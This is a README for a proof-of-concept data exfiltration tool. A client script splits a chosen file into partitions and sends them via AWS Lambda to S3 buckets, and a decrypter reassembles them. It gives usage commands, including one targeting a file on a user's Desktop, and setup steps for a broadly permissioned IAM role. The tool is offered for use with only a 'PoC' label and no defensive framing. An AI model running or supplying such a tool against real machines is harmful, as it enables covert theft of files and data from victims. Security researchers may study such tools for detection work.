# AWS Lambda Exfil Tool [PoC]

Here we have a small PoC on how the program works (The gif is somewhat outdated but the idea is the same)

![StandaloneClientGif](media/standaloneClient.gif)

## About
The program follows the following diagram. Explanation on how each part functions is present on standaloneClient pdf file.  

![StandaloneClient diagram](media/Standalone_client_1.png?raw=true "Standalone Client Diagram")


## Usage
#### Client
`py clientName.py -s <Partition size in kb> -i <File to exfiltrate> -f <OPTIONAL: Disable max partitions (500)>`  
Example:  
`py clientName.py -s 100 -i "C:\Users\SomeUser\Desktop\test.txt"`
#### Decrypter
###### Note: If not sure about hostname and filename, check S3 Bucket after exfiltration
`py decrypter.py -n "Hostname" -i "Filename"`  
Example after exfiltrating test.txt:  
`py decrypter.py -n "ID4A0E" -i "test"`

The decrypter is going to be setup at the first `setup.py` run.    
Decrypter setup is based on `decrypterConfig.json` so the keys used for connection, as well as exfiltration buckets can be changed.  
If AWS account / bucket needs to be changed, please modify the above mentioned json file.

## Setup

###### Note: Use python 3.x  

#### IAM Console
Go to AWS IAM console and create a role (Remember the ARN name) with the following permissions:  

- AWSLambdaFullAccess
- AmazonS3FullAccess
- CloudWatchFullAccess

###### Run `pip install -r requirements.txt`

###### Run `py setup.py` and follow the prompts for client setup

###### Decrypter will be set up the first time it's ran, follow the prompts

#### Partitions
Please take in account the size of the file to be exfiltrated when defining the partition size. By default the max partition number is set to 500. This means that the file to be exfiltrated must weigh `500*partitionSize` or less. This can be overrided by adding `-f` to the client call.   

#### Supported Files
The tool supports txt, csv and xlsx files but every file that is text based (For example a .py file) will be exfiltrated succesfully.
